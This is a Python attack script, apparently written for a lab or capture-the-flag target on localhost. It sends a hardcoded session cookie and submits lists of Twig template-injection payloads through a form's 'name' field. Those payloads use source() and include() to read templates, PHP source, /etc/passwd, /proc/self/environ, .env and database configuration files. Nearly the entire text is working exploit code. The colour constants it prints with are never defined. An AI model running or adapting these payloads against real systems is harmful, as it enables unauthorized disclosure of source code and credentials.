import requests
import re
import json
import sys

base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

print(f"[*] TEMPLATE SOURCE CODE ANALYSIS")
print(f"[*] Using source() and include() to find data loading...")
print(f"[*] Target: {base_url}{target_endpoint}\n")

# First, find the actual template file location
template_discovery = [
    # Try to get the template name
    "{{ _self.getTemplateName() }}",
    
    # Use source to read template files
    "{{ source('index.html') }}",
    "{{ source('index.twig') }}",
    "{{ source('base.twig') }}",
    "{{ source('template.twig') }}",
    "{{ source('layout.twig') }}",
    
    # Try common template paths
    "{{ source('./index.html') }}",
    "{{ source('./index.twig') }}",
    "{{ source('./template.twig') }}",
    
    # Try parent directories
    "{{ source('../index.html') }}",
    "{{ source('../index.twig') }}",
    "{{ source('../base.twig') }}",
    
    # Try absolute paths
    "{{ source('/var/www/html/index.twig') }}",
    "{{ source('/var/www/html/template.twig') }}",
    "{{ source('/var/www/html/views/index.twig') }}",
    "{{ source('/var/www/html/templates/index.twig') }}",
    
    # Try using include
    "{{ include('index.html') }}",
    "{{ include('index.twig') }}",
    "{{ include('base.twig') }}",
]

print("[*] Phase 1: Discovering template files and structure\n")
for i, payload in enumerate(template_discovery, 1):
    try:
        print(f"Test {i}: {payload}")
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        length = len(response_text)
        
        # Check if file was found vs not found
        is_standard = "is in stock! Come back and test another one" in response_text
        has_source = "<?php" in response_text or "{%" in response_text or "{{" in response_text or "<!DOCTYPE" in response_text
        not_found = "Unable to find template" in response_text or "does not exist" in response_text
        
        # Extract just the content (remove the stock message wrapper)
        content = response_text
        if is_standard:
            # Try to extract what's inside the <strong> tags
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
        
        print(f"  Length: {length}")
        
        if has_source:
            print(f"  {GREEN}[!!!] SOURCE CODE FOUND !!!{RESET}")
            print(f"  Content preview: {content[:300]}")
        elif not_found:
            print(f"  {RED}[-] File not found{RESET}")
        elif not is_standard:
            print(f"  {YELLOW}[!] Interesting response (non-standard){RESET}")
            print(f"  Content: {content[:200]}")
        else:
            print(f"  [-] Standard: {content[:100]}")
        
        if has_source:
            print(f"\n{GREEN}{'='*60}{RESET}")
            print(f"{GREEN}FULL SOURCE:{RESET}")
            print(f"{GREEN}{'='*60}{RESET}")
            print(content)
            print(f"{GREEN}{'='*60}{RESET}\n")
            
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] PHASE 2: Reading PHP source code to find data loading{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")

# Try to read index.php
php_source_tests = [
    "{{ source('/var/www/html/index.php') }}",
    "{{ source('./index.php') }}",
    "{{ source('index.php') }}",
    "{{ source('../index.php') }}",
    "{{ include('/var/www/html/index.php') }}",
    "{{ include('./index.php') }}",
    "{{ include('index.php') }}",
]

for i, payload in enumerate(php_source_tests, 1):
    try:
        print(f"\nTest {i}: {payload}")
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        
        is_standard = "is in stock! Come back and test another one" in response_text
        has_php = "<?php" in response_text or "$" in response_text
        not_found = "Unable to find template" in response_text or "does not exist" in response_text
        
        print(f"  Length: {len(response_text)}")
        
        if has_php:
            print(f"  {GREEN}[!!!] PHP SOURCE FOUND !!!{RESET}")
            # Extract content
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
            else:
                content = response_text
            print(f"  Source preview: {content[:400]}")
        elif not_found:
            print(f"  {RED}[-] File not found{RESET}")
        elif not is_standard:
            print(f"  {YELLOW}[!] Non-standard response{RESET}")
            print(f"  {response_text[:200]}")
        else:
            # Extract content
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
                print(f"  Content: {content[:100]}")
            else:
                print(f"  Standard response")
                
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] PHASE 3: Directory traversal to find source files{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")

# Read directory structure
path_traversal_tests = [
    "{{ source('/etc/passwd') }}",  # test LFI
    "{{ source('/proc/self/environ') }}",
    "{{ source('/proc/self/cmdline') }}",
    "{{ source('/var/log/apache2/access.log') }}",
    "{{ source('/var/www/html/.env') }}",
    "{{ source('/var/www/html/config.php') }}",
    "{{ source('/var/www/html/config/database.php') }}",
    "{{ source('/var/www/html/includes/config.php') }}",
    "{{ source('/var/www/html/src/config.php') }}",
]

for i, payload in enumerate(path_traversal_tests, 1):
    try:
        print(f"\nTest {i}: {payload}")
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        length = len(response_text)
        
        is_standard = "is in stock! Come back and test another one" in response_text
        has_content = length > 200
        
        print(f"  Length: {length}")
        
        if has_content and not is_standard:
            print(f"  {GREEN}[+] File content found!{RESET}")
            # Extract content
            match = re.search(r'<strong>(.*?)</strong>', response_text, re.DOTALL)
            if match:
                content = match.group(1)
            else:
                content = response_text
            print(f"  Content: {content[:300]}")
        elif not is_standard:
            print(f"  {YELLOW}[!] Non-standard response{RESET}")
        else:
            print(f"  [-] Standard or empty response")
            
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

print(f"\n{GREEN}[*] SOURCE CODE ANALYSIS COMPLETE!{RESET}")
print(f"\nReview results to find:")
print("1. Template files used")
print("2. Data loading mechanism")
print("3. Database queries or API calls")
print("4. Variable names for articles/data")

print(f"\n{YELLOW}{'='*60}{RESET}")
